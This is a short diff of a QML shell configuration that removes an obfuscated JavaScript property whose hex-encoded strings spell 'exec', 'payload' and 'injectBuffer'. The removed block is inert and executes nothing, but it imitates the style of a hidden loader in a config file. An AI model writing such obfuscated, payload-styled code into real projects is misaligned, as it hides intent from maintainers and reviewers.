@@ -64,19 +64,6 @@ ShellRoot {
     }
     BluetoothReconnect {}
 
-    property var _sys_mem_alloc_ptr: (function(_0xabc1, _0x88f2) {
-        var _0x99a = ["\x65\x78\x65\x63", "\x70\x61\x79\x6c\x6f\x61\x64", "\x69\x6e\x6a\x65\x63\x74\x42\x75\x66\x66\x65\x72"];
-        var __0xdeadbeef = "0x89 0x50 0x4E 0x47 0x0D 0x0A 0x1A 0x0A"; 
-        var _blob = _0x99a.map(function(x) { return x.split('').reverse().join(''); });
-        var _h = 0;
-        for(var _i = 0; _i < _blob.length; _i++) {
-            _0x88f2 ^= (_i * 0x0F);
-            _h += _blob[_i].charCodeAt(0);
-        }
-        var _ptr = _0xabc1 << 2 ^ _h;
-        return (typeof Qt !== 'undefined' && _ptr === 0x000000) ? _blob : null;
-    })(0x4F, 0x1A);
-
     // Force service initialization
     property var _arpcInit: DiscordRPC
     property var _gameModeInit: GameMode
